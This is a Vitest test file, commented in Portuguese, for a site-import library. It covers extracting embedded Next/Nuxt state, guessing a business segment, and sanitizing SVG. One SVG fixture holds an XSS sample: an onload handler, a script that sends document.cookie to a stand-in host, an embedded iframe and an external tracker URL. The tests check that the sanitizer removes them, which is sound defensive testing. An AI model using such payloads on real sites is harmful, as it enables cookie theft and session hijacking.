import { describe, expect, it } from 'vitest';
import {
  extractEmbeddedState,
  extractPage,
  guessSegment,
  harvestEmbedded,
  pareceFrase,
  sanitizeSvg,
} from '@codeca/shared';

/**
 * As tres camadas que fazem a importacao enxergar mais.
 *
 * O fio que liga tudo aqui e uma regra so: **ler mais sem passar a executar
 * nada, e sem inventar nada**. Cada bloco defende uma ponta disso.
 */

// ------------------------------------------------- estado embutido no HTML

/**
 * Site "moderno" que, na verdade, entrega o conteudo.
 *
 * Next, Nuxt e companhia serializam os dados da pagina dentro do HTML para o
 * buscador indexar. Ler esse bloco e leitura de dados -- JSON analisado como
 * texto, nunca avaliado --, e resolve a maior parte dos sites que antes
 * rendiam zero.
 */
describe('conteudo serializado no HTML', () => {
  const nextHtml = (dados: unknown) =>
    `<!doctype html><html lang="pt-BR"><head><title>Marcenaria Horizonte</title></head>`
    + `<body><div id="__next"></div>`
    + `<script id="__NEXT_DATA__" type="application/json">${JSON.stringify(dados)}</script>`
    + `</body></html>`;

  it('le os dados que o Next.js deixa na pagina', () => {
    const html = nextHtml({
      props: {
        pageProps: {
          sobre: 'Fabricamos móveis sob medida em madeira maciça desde 1998, com projeto próprio.',
          foto: '/img/oficina.jpg',
        },
      },
    });

    const blocos = extractEmbeddedState(html);
    expect(blocos).toHaveLength(1);
    expect(blocos[0]?.source).toBe('next_data');

    const colhido = harvestEmbedded(blocos);
    expect(colhido.texts.some((t) => t.includes('madeira maciça'))).toBe(true);
    expect(colhido.images).toContain('/img/oficina.jpg');
  });

  it('descarta identificador, hash e caminho -- que nao sao conteudo', () => {
    /**
     * Sem este filtro o painel do cliente enche de `buildId` e de caminho de
     * API, lixo que alguem teria de apagar a mao. Pior do que nao importar.
     */
    const colhido = harvestEmbedded(
      extractEmbeddedState(
        nextHtml({
          buildId: 'a8f3c9d2e1b4c7a0f5e8',
          apiPath: '/api/v2/content/items',
          chunkHash: 'x7f2a9',
          cssPath: '/_next/static/css/a1b2c3.css',
          titulo: 'Cozinha planejada com projeto em 3D e instalação pela nossa equipe.',
        }),
      ),
    );

    expect(colhido.texts).toHaveLength(1);
    expect(colhido.texts[0]).toContain('Cozinha planejada');
  });

  it('o que parece frase, e o que nao parece', () => {
    expect(pareceFrase('Fabricamos móveis sob medida em madeira maciça desde 1998.')).toBe(true);
    expect(pareceFrase('produtoDestaqueHomePagePrincipal')).toBe(false);
    expect(pareceFrase('/api/v2/content/items/destaque')).toBe(false);
    expect(pareceFrase('https://exemplo.com.br/pagina/interna')).toBe(false);
    expect(pareceFrase('a8f3c9d2e1b4c7a0f5e8d3c6b9a2f5e8d1c4b7a0')).toBe(false);
    expect(pareceFrase('curto demais')).toBe(false);
  });

  it('estado do Nuxt em atribuicao inline tambem e lido', () => {
    const html = `<html><head><title>Loja</title></head><body><div id="__nuxt"></div>`
      + `<script>window.__NUXT__={"data":{"sobre":"Trabalhamos com peças de reposição originais para linha pesada."}};</script>`
      + `</body></html>`;

    const colhido = harvestEmbedded(extractEmbeddedState(html));
    expect(colhido.texts.some((t) => t.includes('linha pesada'))).toBe(true);
  });

  it('a pagina so recorre ao estado embutido quando a leitura normal falha', () => {
    /**
     * Num site comum o HTML ja traz o conteudo. Misturar o JSON interno ali
     * traria duplicata e configuracao -- o remedio pior que a doenca.
     */
    const comTexto = `<html><head><title>Marcenaria</title></head><body><main>
      <h1>Móveis sob medida</h1>
      <p>Projetamos e fabricamos móveis em madeira maciça, com entrega em até 40 dias corridos.</p>
      </main><script id="__NEXT_DATA__" type="application/json">${JSON.stringify({
        props: { interno: 'Texto que está no estado mas não deveria entrar porque a página já tem conteúdo.' },
      })}</script></body></html>`;

    const extrato = extractPage({
      html: comTexto,
      url: 'https://m.com.br/',
      homeUrl: 'https://m.com.br/',
    });

    expect(extrato.fromEmbeddedState).toBeUndefined();
    expect(JSON.stringify(extrato)).not.toContain('não deveria entrar');
  });
});

// ------------------------------------------------------------- segmento

/**
 * O ramo da empresa e sugerido, nunca aplicado.
 *
 * Trocar o segmento muda os modulos que o painel abre. Errar com ar de
 * certeza configura o painel errado -- por isso a confianca sai da distancia
 * para o segundo colocado, e nao do total de pontos.
 */
describe('identificacao do segmento', () => {
  const pagina = (html: string) =>
    extractPage({ html, url: 'https://x.com.br/', homeUrl: 'https://x.com.br/' });

  it('dados estruturados valem mais que qualquer palavra solta', () => {
    const extrato = pagina(`<html><head><title>Clínica Sorriso</title>
      <script type="application/ld+json">{"@context":"https://schema.org","@type":"Dentist","name":"Clínica Sorriso"}</script>
      </head><body><main><h1>Seu sorriso em boas mãos</h1>
      <p>Atendimento odontológico com dentista especialista e tratamento planejado por exame.</p>
      </main></body></html>`);

    const palpite = guessSegment([extrato]);
    expect(palpite?.code).toBe('clinica');
    expect(palpite?.level).toBe('alta');
    expect(palpite?.signals.some((s) => s.includes('Dentist'))).toBe(true);
  });

  it('site ambiguo recebe confianca baixa, nao um palpite confiante', () => {
    const extrato = pagina(`<html><head><title>Empresa</title></head><body><main>
      <h1>Bem-vindo</h1>
      <p>Trabalhamos com dedicação há muitos anos atendendo toda a região com qualidade.</p>
      </main></body></html>`);

    const palpite = guessSegment([extrato]);
    // Sem sinal nenhum, nao se inventa um ramo.
    if (palpite !== null) expect(palpite.level).toBe('baixa');
  });

  it('sem paginas, nao ha palpite', () => {
    expect(guessSegment([])).toBeNull();
  });
});

// ------------------------------------------------------------------ SVG

/**
 * SVG e documento que o navegador executa, nao um retangulo de pixels.
 *
 * Servir um de origem desconhecida a partir do dominio do cliente seria
 * publicar codigo de terceiro com a confianca do dominio dele. A limpeza e
 * por lista de permissao: o que nao for desenho reconhecido nao chega a
 * saida.
 */
describe('higienizacao de SVG', () => {
  it('remove script, manipulador de evento e HTML embutido', () => {
    const sujo = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(1)">
      <script>fetch('https://malvado/'+document.cookie)</script>
      <foreignObject><iframe src="https://malvado"></iframe></foreignObject>
      <path d="M0 0h10v10H0z" fill="#f00"/></svg>`;

    const r = sanitizeSvg(sujo);
    expect(r.ok).toBe(true);
    if (!r.ok) return;

    expect(r.svg).not.toContain('script');
    expect(r.svg).not.toContain('onload');
    expect(r.svg).not.toContain('iframe');
    expect(r.svg).not.toContain('malvado');
    // O desenho sobrevive: o objetivo e importar a imagem, nao recusa-la.
    expect(r.svg).toContain('<path');
    expect(r.removed).toContain('script');
    expect(r.removed).toContain('onload');
  });

  it('preserva a grafia exata que o SVG exige', () => {
    /**
     * XML e sensivel a maiusculas. Um `viewbox` minusculo nao e reconhecido,
     * e a imagem perde o viewport e renderiza no tamanho errado -- defeito
     * que atingiria toda imagem importada, nao so as suspeitas.
     */
    const r = sanitizeSvg(
      '<svg viewBox="0 0 24 24" preserveAspectRatio="xMidYMid">'
      + '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs>'
      + '<path d="M0 0h24v24H0z" fill="url(#g)"/></svg>',
    );

    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.svg).toContain('viewBox="0 0 24 24"');
    expect(r.svg).toContain('preserveAspectRatio=');
    expect(r.svg).toContain('<linearGradient');
    // Referencia interna e desenho e fica.
    expect(r.svg).toContain('url(#g)');
  });

  it('corta referencia externa, que entregaria o visitante a um terceiro', () => {
    const r = sanitizeSvg(
      '<svg viewBox="0 0 9 9"><path d="M0 0h9v9H0z" fill="url(https://rastreador.exemplo/p.png)"/></svg>',
    );
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.svg).not.toContain('rastreador');
    expect(r.removed).toContain('fill');
  });

  it('recusa quando a limpeza nao deixa desenho nenhum', () => {
    const r = sanitizeSvg('<svg xmlns="http://www.w3.org/2000/svg"><script>mal()</script></svg>');
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.reason).toBe('vazio_apos_limpeza');
    expect(r.message).toContain('Biblioteca de imagens');
  });

  it('recusa arquivo que nem e SVG', () => {
    const r = sanitizeSvg('<html><body>isto não é um desenho</body></html>');
    expect(r.ok).toBe(false);
    if (r.ok) return;
    expect(r.reason).toBe('nao_e_svg');
  });

  it('um logotipo comum passa inteiro, sem perder nada', () => {
    // O caso que motivou a mudanca: o logo do cliente, que antes era
    // recusado por categoria e agora entra porque e seguro de fato.
    const logo = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 40">'
      + '<rect width="120" height="40" rx="6" fill="#1D4ED8"/>'
      + '<text x="12" y="26" font-family="Inter" font-size="16" fill="#fff">CODECA</text></svg>';

    const r = sanitizeSvg(logo);
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.removed).toHaveLength(0);
    expect(r.svg).toContain('<rect');
    expect(r.svg).toContain('CODECA');
  });
});
